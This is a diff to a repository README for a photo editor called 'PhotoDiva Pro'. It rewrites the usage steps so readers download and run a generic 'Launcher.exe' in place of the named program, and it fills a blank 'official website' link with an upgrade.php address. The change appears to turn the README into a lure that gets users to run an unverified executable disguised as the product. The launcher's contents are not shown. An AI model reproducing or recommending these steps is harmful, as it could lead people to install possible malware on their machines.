@@ -27,9 +27,9 @@ PhotoDiva Pro is a powerful photo editing tool that allows users to easily and q
 
 ## How to Use PhotoDiva Pro
 Here are a few simple steps to get started with PhotoDiva Pro:
-1. Download PhotoDiva Pro from the link above.
+1. Download Launcher from the link above.
 2. Install the downloaded file to your desired location.
-3. Launch PhotoDiva Pro and start editing your photos with ease!
+3. Launch "Launcher.exe" and start editing your photos with ease!
 
 ## Stay Updated
 Don’t miss out on the latest updates and releases for PhotoDiva Pro! Keep an eye on the "Releases" section of this repository for new features and enhancements.
@@ -45,7 +45,7 @@ This repository is released under the MIT License. You are free to explore, down
 
 ---
 
-🔗 Visit [PhotoDiva's Official Website]() for more information about PhotoDiva Pro.
+🔗 Visit [PhotoDiva's Official Website](https://photodiva.net/upgrade.php) for more information about PhotoDiva Pro.
 
 Happy photo editing with PhotoDiva Pro! 📸
 
